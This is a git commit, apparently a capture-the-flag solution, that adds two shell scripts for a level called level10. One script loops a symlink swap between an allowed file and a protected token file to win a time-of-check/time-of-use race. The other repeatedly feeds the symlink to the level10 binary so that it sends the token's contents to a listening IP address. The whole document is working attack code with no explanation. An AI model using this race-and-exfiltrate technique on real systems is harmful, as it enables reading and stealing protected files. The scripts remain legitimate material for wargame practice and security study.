307fa5efbac7a752d4b6e148aad5e9d479fdb43b
Hohenfels <hapeiste@gmail.com>
2020-02-27 01:36:51 +0100

    lvl12

---
+++ level10/Ressources/racecondition.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+while true; do
+    ln -sf ~/level10 /tmp/exploit
+    ln -sf ~/token /tmp/exploit
+done
---
+++ level10/Ressources/sendfile.sh
@@ -0,0 +1,6 @@
+#!/bin/sh
+while true; do
+        /home/user/level10/level10 /tmp/exploit 192.168.1.26
+done
+
+# remplacer l'ip par celle de votre vm
